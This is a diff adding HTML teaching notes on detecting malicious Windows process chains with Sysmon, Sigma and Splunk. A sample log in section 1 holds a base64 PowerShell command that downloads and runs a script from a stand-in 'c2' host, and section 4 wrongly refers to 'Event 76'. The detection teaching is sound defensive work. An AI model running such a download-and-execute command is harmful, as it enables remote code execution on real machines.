@@ -1,0 +1,61 @@
+<div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
+<h6 class="text-danger mb-3"><i class="bi bi-book me-2"></i>Elaborated Notes with Examples</h6>
+
+<h6 class="text-danger mt-3">1. Suspicious Process Creation</h3>
+<p>Sysmon Event ID 1 (ProcessCreate) captures every process creation event. Key fields: <code>CommandLine</code>, <code>ParentImage</code>, <code>Image</code>, <code>User</code>, <code>ProcessId</code>, <code>Hashes</code>. Detection focuses on unusual parent-child relationships (e.g., <code>winword.exe</code> spawning <code>cmd.exe</code>), processes launched from suspicious locations (<code>%TEMP%</code>, <code>%APPDATA%</code>, <code>%LOCALAPPDATA%</code>), and unsigned binaries.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Example:</b> Sysmon Event 1 log:<br>
+<code>RuleName: technique_id=T1055,technique_name=Process Injection</code><br>
+<code>UtcTime: 2026-06-17 08:46:12.345</code><br>
+<code>ProcessGuid: {A1B2C3D4-E5F6-7890-ABCD-EF1234567890}</code><br>
+<code>ProcessId: 4567</code><br>
+<code>Image: C:\Windows\System32\cmd.exe</code><br>
+<code>CommandLine: cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=</code><br>
+<code>ParentImage: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</code><br>
+<code>ParentCommandLine: "WINWORD.EXE" /n "C:\Users\victim\Desktop\Invoice_2026.docm"</code><br>
+<code>User: CORP\victim</code><br>
+This is a textbook macro -> cmd -> powershell chain. The parent is WINWORD.EXE (signed by Microsoft), child is cmd.exe (also signed), but the command line reveals the malicious base64 payload.
+</div>
+
+<h6 class="text-danger mt-3">2. Unsigned Processes from Temp</h3>
+<p>Windows native executables are digitally signed by Microsoft. Detection rule: unsigned executables running from user-writable locations (<code>%TEMP%</code>, <code>%APPDATA%</code>, <code>%LOCALAPPDATA%</code>, <code>%USERPROFILE%\Downloads</code>) have high suspicion, especially when spawned by Office products, browsers, or scripting interpreters.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Example:</b> Sysmon Event 1 (with check for signature):<br>
+<code>Image: C:\Users\victim\AppData\Local\Temp\svchost.exe</code><br>
+<code>Signed: N/A (no signature)</code><br>
+<code>ParentImage: C:\Windows\System32\rundll32.exe</code><br>
+<code>ParentCommandLine: rundll32.exe C:\Users\victim\AppData\Local\Temp\dll.dll,Install</code><br>
+The file <code>svchost.exe</code> is in the temp directory with a name mimicking a system process. It is unsigned. The parent chain shows <code>winword.exe -> mshta.exe -> rundll32.exe -> svchost.exe</code>. Each parent is signed but the final child is unsigned and in a user-writable location. The EDR tags this as "Process from suspicious location — unsigned binary" with an alert score of 9/10.
+</div>
+
+<h6 class="text-danger mt-3">3. Parent-Child Chain Analysis</h3>
+<p>Analyzing process ancestry reveals attack techniques. Legitimate chains: <code>explorer.exe -> winword.exe</code> (user opens Office doc). Malicious: <code>winword.exe -> cmd.exe -> powershell.exe -> rundll32.exe</code>. Chain analysis in SIEM: correlate Event IDs 1 (ProcessCreate) and group by <code>ProcessGuid</code> matching <code>ParentProcessGuid</code>.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Example Chain Reconstruction:</b><br>
+(1) <code>explorer.exe (PID: 1000) -> WINWORD.EXE (PID: 2000) C:\Users\victim\Desktop\Invoice.docm</code><br>
+(2) <code>WINWORD.EXE (PID: 2000) -> cmd.exe (PID: 3000) cmd /c powershell.exe -enc ...</code><br>
+(3) <code>cmd.exe (PID: 3000) -> powershell.exe (PID: 4000) powershell -enc ...</code><br>
+(4) <code>powershell.exe (PID: 4000) -> rundll32.exe (PID: 5000) rundll32 C:\Users\victim\AppData\Local\Temp\dll.dll,DllMain</code><br>
+(5) <code>rundll32.exe (PID: 5000) -> svchost.exe (PID: 6000) C:\Users\victim\AppData\Local\svchost.exe</code><br>
+(6) <code>svchost.exe (PID: 6000) -> powershell.exe (PID: 7000) powershell -enc ...(mimikatz)...</code><br>
+The chain shows the full kill chain: phishing -> macro -> powershell download -> DLL sideload -> persistence -> credential theft. The analyst can write a detection rule: <code>WINWORD.EXE spawning ANY of (cmd.exe, powershell.exe, wscript.exe, cscript.exe, mshta.exe, regsvr32.exe, rundll32.exe)</code>.
+</div>
+
+<h6 class="text-danger mt-3">4. Detection Rules & Tuning</h3>
+<p>Effective rules for Event 76 detections: (1) Unsigned executable in user-writable path. (2) Unusual parent-child relationships (Office -> cmd/powershell). (3) Process spawned from <code>%TEMP%</code> with a name mimicking system processes (<code>svchost.exe</code>, <code>rundll32.exe</code>, <code>explorer.exe</code>). (4) Processes with no valid signature but masquerading as Microsoft-signed processes.</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Example Sigma Rule:</b><br>
+<code>title: Suspicious Process from Temp by Office</code><br>
+<code>logsource: category: process_creation</code><br>
+<code>detection:</code><br>
+<code>&nbsp;&nbsp;selection:</code><br>
+<code>&nbsp;&nbsp;&nbsp;&nbsp;ParentImage|endswith: '\WINWORD.EXE'</code><br>
+<code>&nbsp;&nbsp;&nbsp;&nbsp;Image|contains: '\Temp\'</code><br>
+<code>&nbsp;&nbsp;condition: selection</code><br>
+<code>falsepositives:</code><br>
+<code>&nbsp;&nbsp;- Internal tools that drop executables to temp (should be excluded)</code><br>
+<code>level: high</code><br>
+When deployed in Splunk: <code>index=windows sourcetype="WinEventLog:Sysmon" EventCode=1 ParentImage="*WINWORD.EXE" Image="*\\Temp\\*" | table _time, ComputerName, User, Image, CommandLine</code>. The analyst tunes by excluding known IT tools: <code>NOT (Image="*\\Temp\\ITDeploy*" OR Hashes="*KNOWN_GOOD_HASH*")</code>.
+</div>
+
+</div>
